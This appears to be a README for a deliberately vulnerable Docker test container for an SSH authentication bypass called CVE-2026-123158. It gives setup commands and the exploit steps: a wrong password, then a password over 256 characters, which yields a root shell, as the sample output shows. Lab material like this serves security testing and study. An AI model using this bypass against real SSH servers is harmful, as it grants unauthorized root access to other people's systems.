# Vulnerable docker container for testing CVE-2026-123158 (\*sshole)
Requirements: git, docker, docker-compose
First run:
```bash
git clone https://github.com/jakub-petrovic/sshole-docker.git
cd sshole-docker
docker compose up -d --build
```
Other runs:
```bash
docker compose up -d
```

# How to exploit this container?
Its super easy :3
Just start ssh, first password is wrong, second one has to be longer then 256 character.
```bash
ssh -o StrictHostKeyChecking=no root@localhost -p 2222
```
You will se output something like this:
```
root@localhost's password: 
Permission denied, please try again.
root@localhost's password: 
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <https://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

cc118e32da21:~# 
```
